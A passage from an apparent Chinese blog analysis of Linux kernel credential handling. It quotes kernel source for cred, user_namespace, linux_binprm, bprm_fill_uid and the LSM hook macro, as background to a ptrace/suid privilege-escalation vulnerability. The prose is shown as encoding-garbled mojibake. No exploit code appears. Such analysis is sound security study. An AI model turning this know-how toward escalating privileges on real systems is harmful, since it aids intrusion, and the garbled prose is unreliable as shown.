class="hljs-type">kgid_t</span>gid;<span class="hljs-comment">/* real GID of the task */</span><br><span class="hljs-type">kuid_t</span>suid;<span class="hljs-comment">/* saved UID of the task */</span><br><span class="hljs-type">kgid_t</span>sgid;<span class="hljs-comment">/* saved GID of the task */</span><br><span class="hljs-type">kuid_t</span>euid;<span class="hljs-comment">/* effective UID of the task */</span><br><span class="hljs-type">kgid_t</span>egid;<span class="hljs-comment">/* effective GID of the task */</span><br><span class="hljs-type">kuid_t</span>fsuid;<span class="hljs-comment">/* UID for VFS ops */</span><br><span class="hljs-type">kgid_t</span>fsgid;<span class="hljs-comment">/* GID for VFS ops */</span><br><span class="hljs-type">unsigned</span>securebits;<span class="hljs-comment">/* SUID-less security management */</span><br><span class="hljs-type">kernel_cap_t</span>cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br><span class="hljs-type">kernel_cap_t</span>cap_permitted;<span class="hljs-comment">/* caps we&#x27;re permitted */</span><br><span class="hljs-type">kernel_cap_t</span>cap_effective;<span class="hljs-comment">/* caps we can actually use */</span><br><span class="hljs-type">kernel_cap_t</span>cap_bset;<span class="hljs-comment">/* capability bounding set */</span><br><span class="hljs-type">kernel_cap_t</span>cap_ambient;<span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>jit_keyring;<span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment"> * keys to */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><span class="hljs-comment">/* real user ID subscription */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span><span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br><span class="hljs-comment">/* RCU deletion */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">int</span> non_rcu;<span class="hljs-comment">/* Can we skip RCU deletion? */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span><span class="hljs-title">rcu</span>;</span><span class="hljs-comment">/* RCU deletion hook */</span><br>&#125;;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨<code>cred</code>ç»“æ„ä½“ä¸­ç®¡ç†æƒé™çš„å˜é‡</p><h3 id="ç”¨æˆ·ID-ç»„ID">ç”¨æˆ·ID &amp; ç»„ID</h3><p>ä¸€ä¸ªcredç»“æ„ä½“ä¸­è®°è½½äº†<strong>ä¸€ä¸ªè¿›ç¨‹å››ç§ä¸åŒçš„ç”¨æˆ·ID</strong>ï¼š</p><ul><li><strong>çœŸå®ç”¨æˆ·ID</strong>ï¼ˆreal UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>å¯åŠ¨æ—¶çš„ç”¨æˆ·ID</strong></li><li><strong>ä¿å­˜ç”¨æˆ·ID</strong>ï¼ˆsaved UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>æœ€åˆçš„æœ‰æ•ˆç”¨æˆ·ID</strong></li><li><strong>æœ‰æ•ˆç”¨æˆ·ID</strong>ï¼ˆeffective UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>æ­£åœ¨è¿è¡Œæ—¶æ‰€å±çš„ç”¨æˆ·ID</strong>ï¼Œä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œé€”ä¸­æ˜¯å¯ä»¥æ”¹å˜è‡ªå·±æ‰€å±ç”¨æˆ·çš„ï¼Œå› è€Œæƒé™æœºåˆ¶ä¹Ÿæ˜¯é€šè¿‡æœ‰æ•ˆç”¨æˆ·IDè¿›è¡Œè®¤è¯çš„ï¼Œå†…æ ¸é€šè¿‡ euid æ¥è¿›è¡Œç‰¹æƒåˆ¤æ–­ï¼›ä¸ºäº†é˜²æ­¢ç”¨æˆ·ä¸€ç›´ä½¿ç”¨é«˜æƒé™ï¼Œå½“ä»»åŠ¡å®Œæˆä¹‹åï¼Œeuid ä¼šä¸ suid è¿›è¡Œäº¤æ¢ï¼Œæ¢å¤è¿›ç¨‹çš„æœ‰æ•ˆæƒé™</li><li><strong>æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·ID</strong>ï¼ˆUID for VFS opsï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹<strong>åˆ›å»ºæ–‡ä»¶æ—¶è¿›è¡Œæ ‡è¯†çš„ç”¨æˆ·ID</strong></li></ul><p>åœ¨é€šå¸¸æƒ…å†µä¸‹è¿™å‡ ä¸ªIDåº”å½“éƒ½æ˜¯ç›¸åŒçš„</p><p>ç”¨æˆ·ç»„IDåŒæ ·åˆ†ä¸ºå››ä¸ªï¼š<code>çœŸå®ç»„ID</code>ã€<code>ä¿å­˜ç»„ID</code>ã€<code>æœ‰æ•ˆç»„ID</code>ã€<code>æ–‡ä»¶ç³»ç»Ÿç»„ID</code>ï¼Œä¸ç”¨æˆ·IDæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™</p><h3 id="å‘½åç©ºé—´ï¼ˆnamespaceï¼‰">å‘½åç©ºé—´ï¼ˆnamespaceï¼‰</h3><p>cred ç»“æ„ä½“ä¸­çš„ user_ns  å­—æ®µæ ‡è¯†äº†è¯¥è¿›ç¨‹æ‰€å±çš„å‘½åç©ºé—´</p><h2 id="namespaceï¼šå‘½åç©ºé—´">namespaceï¼šå‘½åç©ºé—´</h2><p><strong>å‘½åç©ºé—´</strong>ï¼ˆ<strong>namespace</strong>ï¼‰ <strong>æ˜¯ Linux kernel ç”¨æ¥éš”ç¦»å†…æ ¸èµ„æºçš„æ–¹å¼ã€‚</strong> é€šè¿‡ namespace å¯ä»¥è®©ä¸€äº›è¿›ç¨‹åªèƒ½çœ‹åˆ°ä¸è‡ªå·±ç›¸å…³çš„ä¸€éƒ¨åˆ†èµ„æºï¼Œè€Œå¦å¤–ä¸€äº›è¿›ç¨‹ä¹Ÿåªèƒ½çœ‹åˆ°ä¸å®ƒä»¬è‡ªå·±ç›¸å…³çš„èµ„æºï¼ŒåŒæ–¹éƒ½æ— æ³•è®¿é—®å¯¹æ–¹å‘½åç©ºé—´ä¸­çš„èµ„æº</p><p>åœ¨ cred å½“ä¸­æœ‰æŒ‡å‘å…¶æ‰€å±å‘½åç©ºé—´çš„æŒ‡é’ˆï¼Œåœ¨Linux kernel ä¸­å‘½åç©ºé—´ä¸ºä¸€ä¸ª <code>user_namespace</code> ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/user_namespace.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uid_gid_map</span><span class="hljs-title">uid_map</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uid_gid_map</span><span class="hljs-title">gid_map</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uid_gid_map</span><span class="hljs-title">projid_map</span>;</span><br><span class="hljs-type">atomic_t</span>count;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">parent</span>;</span><br><span class="hljs-type">int</span>level;<br><span class="hljs-type">kuid_t</span>owner;<br><span class="hljs-type">kgid_t</span>group;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ns_common</span><span class="hljs-title">ns</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>flags;<br><br><span class="hljs-comment">/* Register of per-UID persistent keyrings for this namespace */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PERSISTENT_KEYRINGS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">persistent_keyring_register</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span><span class="hljs-title">persistent_keyring_register_sem</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span><span class="hljs-title">work</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSCTL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ctl_table_set</span><span class="hljs-title">set</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ctl_table_header</span> *<span class="hljs-title">sysctls</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucounts</span>*<span class="hljs-title">ucounts</span>;</span><br><span class="hljs-type">int</span> ucount_max[UCOUNT_COUNTS];<br>&#125;;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™å‡ ä¸ªå­—æ®µï¼š</p><ul><li><strong>owner</strong>ï¼šå³è¯¥å‘½åç©ºé—´çš„<strong>æ‰€æœ‰è€…</strong>ï¼›é€šå¸¸æ¥è¯´æ¯ä¸ªè¿›ç¨‹æœ‰å…¶ç‹¬ç«‹çš„å‘½åç©ºé—´ï¼Œä½†å¯¹äºä¸€äº›éœ€è¦å…±äº«èµ„æºçš„è¿›ç¨‹è€Œè¨€ä»–ä»¬æœ‰å¯èƒ½ä¼šéœ€è¦å…±äº«åŒä¸€ä¸ªå‘½åç©ºé—´</li><li><strong>group</strong>ï¼šå‘½åç©ºé—´æ‰€å±çš„ç”¨æˆ·ç»„</li><li><strong>parent</strong>ï¼šè¯¥å‘½åç©ºé—´çš„çˆ¶å‘½åç©ºé—´ï¼Œå…³ç³»ç±»ä¼¼äºçˆ¶å­è¿›ç¨‹ï¼Œæœ€ä¸Šä¸€å±‚ä¸º init_cred çš„å‘½åç©ºé—´ <code>init_user_ns</code></li></ul><h2 id="linux-binprmï¼šå¾…æ‰§è¡Œæ–‡ä»¶æ•°æ®">linux_binprmï¼šå¾…æ‰§è¡Œæ–‡ä»¶æ•°æ®</h2><p>å‰é¢è®²åˆ° ptrace åº”å½“é…åˆç€ execve è¿›è¡Œä½¿ç”¨ï¼Œåœ¨ execve ç³»ç»Ÿè°ƒç”¨ä¸­æ¶‰åŠåˆ°ä¸€ä¸ªç»“æ„ä½“å«åš <code>linux_binprm</code>ï¼Œè¯¥ç»“æ„ä½“ç”¨ä»¥è®°å½• kernel åŠ è½½ï¼ˆå…¶å®å°±æ˜¯æ‰§è¡Œï¼‰ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ç”¨åˆ°çš„æ•°æ®ï¼Œå®šä¹‰äº <code>/include/linux/binfmts.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This structure is used to hold the arguments that are used when loading binaries.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_binprm</span> &#123;</span><br><span class="hljs-type">char</span> buf[BINPRM_BUF_SIZE];<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MMU</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vma_pages;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_ARG_PAGES32</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>[<span class="hljs-title">MAX_ARG_PAGES</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> p; <span class="hljs-comment">/* current top of mem */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br>cred_prepared:<span class="hljs-number">1</span>,<span class="hljs-comment">/* true if creds already prepared (multiple</span><br><span class="hljs-comment"> * preps happen for interpreters) */</span><br>cap_effective:<span class="hljs-number">1</span>;<span class="hljs-comment">/* true if has elevated effective capabilities,</span><br><span class="hljs-comment"> * false if not; except for init which inherits</span><br><span class="hljs-comment"> * its parent&#x27;s caps anyway */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __alpha__</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> taso:<span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> recursion_depth; <span class="hljs-comment">/* only for search_binary_handler() */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> * <span class="hljs-title">file</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* new credentials */</span><br><span class="hljs-type">int</span> unsafe;<span class="hljs-comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> per_clear;<span class="hljs-comment">/* bits to clear in current-&gt;personality */</span><br><span class="hljs-type">int</span> argc, envc;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> * filename;<span class="hljs-comment">/* Name of binary as seen by procps */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> * interp;<span class="hljs-comment">/* Name of the binary really executed. Most</span><br><span class="hljs-comment">   of the time same as filename, but could be</span><br><span class="hljs-comment">   different for binfmt_&#123;misc,script&#125; */</span><br><span class="hljs-type">unsigned</span> interp_flags;<br><span class="hljs-type">unsigned</span> interp_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> loader, exec;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ cred å­—æ®µï¼Œå…¶æ ‡è¯†äº†è¦è¿è¡Œçš„<strong>æ–°ç¨‹åºçš„æƒé™</strong></p><h2 id="LSM-ä¸-ç¨‹åºæ‰§è¡Œæƒé™æ£€æŸ¥">LSM ä¸ ç¨‹åºæ‰§è¡Œæƒé™æ£€æŸ¥</h2><p>åœ¨ task_struct ç»“æ„ä½“å½“ä¸­æˆ‘ä»¬æ³¨æ„åˆ° <code>ptracer_cred</code> è¿™ä¸ªå­—æ®µï¼Œè¿™ä¸ªå­—æ®µè‡ª <code>Linux kernel 4.10</code>  å¼•å…¥åˆ° task_struct ç»“æ„ä½“å½“ä¸­ï¼Œå¼•å…¥ ptracer_cred çš„ç›®çš„æ˜¯ç”¨äºå½“ tracee æ‰§è¡Œ exec å»åŠ è½½ <a href="https://www.computerhope.com/jargon/s/setuid.htm">setuid executable</a> æ—¶åšå®‰å…¨æ£€æµ‹</p><blockquote><p>å‚è§ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67">ptrace: Capture the ptracerâ€™s creds not PT_PTRACE_CAP</a></p></blockquote><p>è¿™ä¸€éƒ¨åˆ†ä¼šå±•å¼€åˆ†æä¸€å®šæ•°é‡çš„å†…æ ¸æºç ï¼Œé’ˆå¯¹è¿™ä¸ªæ¼æ´è€Œè¨€ï¼Œå¯ä»¥ç›´æ¥çœ‹ç»“è®ºï¼š<strong>è‹¥ ptracee è¿›ç¨‹æ‰§è¡Œ suid/sgid ç¨‹åºï¼Œåˆ™æ£€æŸ¥ ptracee ä¿å­˜çš„ ptracer çš„ credï¼Œå³ ptracee çš„ task_struct çš„ ptracer_cred å­—æ®µçš„æƒé™ï¼Œè‹¥æƒé™ä¸è¶³åˆ™ ptracee ä»¥å…¶è‡ªèº«çš„ euid/egid æ‰§è¡Œç¨‹åºï¼Œè€Œéæ–‡ä»¶çš„ suid/sgid</strong></p><h3 id="suid-sgid-æ–‡ä»¶çš„æ‰§è¡Œæµç¨‹">suid/sgid æ–‡ä»¶çš„æ‰§è¡Œæµç¨‹</h3><p>å½“ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œä¸€ä¸ª suid æ–‡ä»¶æ—¶ï¼ˆä¾‹å¦‚ <code>/usr/bin/passwd</code>ï¼‰ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_execve()<br>    do_execve()<br>    do_execveat_common()<br>    prepare_binprm()<br>    bprm_fill_uid()<br></code></pre></td></tr></table></figure><p>å‡½æ•° <code>bprm_fill_uid()</code> å®šä¹‰äº <code>/fs/exec.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">bprm_fill_uid</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> linux_binprm *bprm)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mode;<br><span class="hljs-type">kuid_t</span> uid;<br><span class="hljs-type">kgid_t</span> gid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Since this can be called multiple times (via prepare_binprm),</span><br><span class="hljs-comment"> * we must clear any previous work done when setting set[ug]id</span><br><span class="hljs-comment"> * bits from any earlier bprm-&gt;file uses (for example when run</span><br><span class="hljs-comment"> * first for a setuid script then again for its interpreter).</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">// ç¬”è€…æ³¨ï¼šé¦–å…ˆä½¿ç”¨åŸè¿›ç¨‹ euid egid</span><br>bprm-&gt;cred-&gt;euid = current_euid();<br>bprm-&gt;cred-&gt;egid = current_egid();<br><br><span class="hljs-keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (task_no_new_privs(current))<br><span class="hljs-keyword">return</span>;<br><br>inode = file_inode(bprm-&gt;file);<br>mode = READ_ONCE(inode-&gt;i_mode);<br><span class="hljs-keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID)))<br><span class="hljs-keyword">return</span>; <span class="hljs-comment">// ç¬”è€…æ³¨ï¼šä¸æ˜¯ suid/sgid ç¨‹åºï¼Œç›´æ¥è¿”å›ï¼Œå¦åˆ™å°† euid/egid è®¾ä¸ºæ–‡ä»¶ uid/gid</span><br><br><span class="hljs-comment">/* Be careful if suid/sgid is set */</span><br>inode_lock(inode);<br><br><span class="hljs-comment">/* reload atomically mode/uid/gid now that lock held */</span><br>mode = inode-&gt;i_mode;<br>uid = inode-&gt;i_uid;<br>gid = inode-&gt;i_gid;<br>inode_unlock(inode);<br><br><span class="hljs-comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span><br><span class="hljs-keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||<br> !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (mode &amp; S_ISUID) &#123;<br>bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;<br>bprm-&gt;cred-&gt;euid = uid;<br>&#125;<br><br><span class="hljs-keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;<br>bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;<br>bprm-&gt;cred-&gt;egid = gid;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ³¨æ„åˆ°è¿™æ ·ä¸€ä¸ªé€»è¾‘ï¼šå½“æˆ‘ä»¬å°è¯•è¿è¡Œä¸€ä¸ª suid ç¨‹åºæ—¶ï¼Œå…¶ä¼šå°†æ–°è¿›ç¨‹çš„ cred-&gt;euid è®¾ç½®ä¸º suid æ–‡ä»¶çš„ uid</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ fork å‡ºå­è¿›ç¨‹è¿è¡Œ suid ç¨‹åºã€çˆ¶è¿›ç¨‹å† ptrace attach å²‚ä¸å°±èƒ½ç›´æ¥å®Œæˆææƒäº†å—ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œå› ä¸ºåé¢è¿˜ä¼šè¿›è¡Œæƒé™æ£€æŸ¥ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¸ªè°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_execve()<br>    do_execve()<br>    do_execveat_common()<br>    prepare_binprm()<br>    bprm_fill_uid()<br>    security_bprm_set_creds()<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å®šä¹‰äº <code>security/security.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">security_bprm_set_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> linux_binprm *bprm)</span><br>&#123;<br><span class="hljs-keyword">return</span> call_int_hook(bprm_set_creds, <span class="hljs-number">0</span>, bprm);<br>&#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶åªæœ‰ä¸€ä¸ªè¯­å¥ä½†è§£é‡Šèµ·æ¥å¯èƒ½æœ‰ç‚¹å¤æ‚ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ–°çš„æ¦‚å¿µâ€”â€” <code>Linux Security Modules</code>ï¼ˆLSMï¼‰</p><h3 id="Linux-Security-Modules">Linux Security Modules</h3><p>LSM å³ Linux å®‰å…¨æ¨¡ç»„ï¼Œç±»ä¼¼äº VFSï¼Œ å…¶æä¾›äº†ç»Ÿä¸€çš„å®‰å…¨ä¸šåŠ¡é€»è¾‘æ¥å£ï¼Œä¾‹å¦‚ SELinux ä¾¿æ˜¯åŸºäº LSM å®ç°çš„ï¼Œæ•´ä½“æ¡†æ¶å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/01/12/f91geXREUiTyFSm.png" alt="å·çš„å›¾.png"></p><blockquote><p>å¯ç”¨è¿™ä¸ªæ¡†æ¶éœ€è¦å¼€å¯å†…æ ¸ç¼–è¯‘é€‰é¡¹ <code>CONFIG_SECURITY</code>ï¼ˆé»˜è®¤å¼€å¯ï¼‰</p></blockquote><p>ç°åœ¨æˆ‘ä»¬æ¥å‰–æ <code>call_int_hook</code> å®ï¼Œè¯¥å®ç”¨äº<strong>è°ƒç”¨å¯¹åº”çš„ LSM é’©å­</strong>ï¼Œå®šä¹‰äº <code>/security/security.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;\</span><br><span class="hljs-meta">int RC = IRC;\</span><br><span class="hljs-meta">do &#123;\</span><br><span class="hljs-meta">struct security_hook_list *P;\</span><br><span class="hljs-meta">\</span><br><span class="hljs-meta">list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) &#123; \</span><br><span class="hljs-meta">RC = P-&gt;hook.FUNC(__VA_ARGS__);\</span><br><span class="hljs-meta"><span class="hljs-keyword">if</span> (RC != 0)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">&#125;\</span><br><span class="hljs-meta">&#125; while (0);\</span><br><span class="hljs-meta">RC;\</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>list_for_each_entry</code> æ˜¯å†…æ ¸ä¸­å¸¸ç”¨éå†å®ï¼Œè¿™é‡Œä¸å†èµ˜å™ï¼Œè¿™é‡Œçš„ <code>security_hook_heads</code> æ˜¯ä¸€ä¸ª<strong>å…¨å±€ç»“æ„ä½“</strong>ï¼Œé˜…è¯»æºç å¯ä»¥å‘ç°å…¶ä¸­å­˜æ”¾çš„éƒ½æ˜¯å†…æ ¸åŒå‘é“¾è¡¨ç»“æ„ï¼Œå…¶å®å¯¹åº”çš„åº”å½“æ˜¯ <code>security_hook_list</code> ç»“æ„ä½“ï¼Œå®šä¹‰äº 